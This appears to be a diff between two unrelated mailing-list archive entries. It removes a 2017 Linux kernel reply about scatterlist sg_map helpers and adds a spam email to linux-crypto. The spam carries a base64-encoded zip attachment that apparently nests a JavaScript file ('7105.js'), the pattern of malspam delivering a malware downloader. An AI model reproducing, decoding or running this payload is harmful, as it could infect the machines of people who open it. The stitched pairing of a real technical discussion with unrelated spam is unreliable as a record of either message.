@@ -1,65 +1,91 @@
-From: Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>
-Subject: Re: [PATCH v2 01/21] scatterlist: Introduce sg_map helper functions
-Date: Thu, 27 Apr 2017 09:57:58 -0600
-Message-ID: <cb1ed262-110b-2a6c-f9da-e41c2fc0969d@deltatee.com>
-References: <1493144468-22493-1-git-send-email-logang@deltatee.com>
- <1493144468-22493-2-git-send-email-logang@deltatee.com>
- <20170426074416.GA7936@lst.de>
- <4736d44e-bbcf-5d59-a1a9-317d0f4da847@deltatee.com>
- <20170427065338.GA20677@lst.de> <20170427152720.GA7662@obsidianresearch.com>
+From: <delaware.orders@nationalcorp.com>
+Subject: 59646 linux-crypto
+Date: Thu, 27 Apr 2017 16:37:51 -0000
+Message-ID: <149331107152.4257.3154230734156782713@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: linux-nvdimm-y27Ovi1pjclAfugRpC6u6w@public.gmane.org, dri-devel-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org,
- dm-devel-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org, target-devel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- Sumit Semwal <sumit.semwal-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>, devel-gWbeCf7V1WCQmaza687I9mD2FQJk+8+b@public.gmane.org,
- "James E.J. Bottomley" <jejb-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org>, linux-scsi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- Matthew Wilcox <mawilcox-0li6OtcxBFHby3iVrkZq2A@public.gmane.org>, linux-rdma-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- open-iscsi-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org, linux-media-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- intel-gfx-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org, sparmaintainer-GLv8BlqOqDDQT0dZR+AlfA@public.gmane.org,
- linux-raid-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, megaraidlinux.pdl-dY08KVG/lbpWk0Htik3J/w@public.gmane.org,
- Jens Axboe <axboe-tSWWG44O7X1aa/9Udqfwiw@public.gmane.org>,
- "Martin K. Petersen" <martin.petersen-QHcLZuEGTsvQT0dZR+AlfA@public.gmane.org>,
- Greg Kroah-Hartman <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org>, linux-mmc-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-crypto-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- netdev-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Jason Gunthorpe <jgunthorpe-ePGOBjL8dl3ta4EC/59zMFaTQe2KTcn/@public.gmane.org>,
- Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org>
-Return-path: <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-In-Reply-To: <20170427152720.GA7662-ePGOBjL8dl3ta4EC/59zMFaTQe2KTcn/@public.gmane.org>
-List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.01.org/pipermail/linux-nvdimm/>
-List-Post: <mailto:linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Help: <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=subscribe>
-Errors-To: linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org
-Sender: "Linux-nvdimm" <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Id: linux-crypto.vger.kernel.org
+Content-Type: application/zip; name="1518006.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from 1-169-75-22.dynamic-ip.hinet.net ([1.169.75.22]:47153 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S938797AbdD0Qh7 (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Thu, 27 Apr 2017 12:37:59 -0400
+Content-Disposition: attachment
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-
-
-On 27/04/17 09:27 AM, Jason Gunthorpe wrote:
-> On Thu, Apr 27, 2017 at 08:53:38AM +0200, Christoph Hellwig wrote:
-> How about first switching as many call sites as possible to use
-> sg_copy_X_buffer instead of kmap?
-
-Yeah, I could look at doing that first.
-
-One problem is we might get more Naks of the form of Herbert Xu's who
-might be concerned with the performance implications.
-
-These are definitely a bit more invasive changes than thin wrappers
-around kmap calls.
-
-> A random audit of Logan's series suggests this is actually a fairly
-> common thing.
-
-It's not _that_ common but there are a significant fraction. One of my
-patches actually did this to two places that seemed to be reimplementing
-the sg_copy_X_buffer logic.
-
-Thanks,
-
-Logan
+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
+AVBLBQYAAAAAAQABAFoAAADoDwAAAAA=
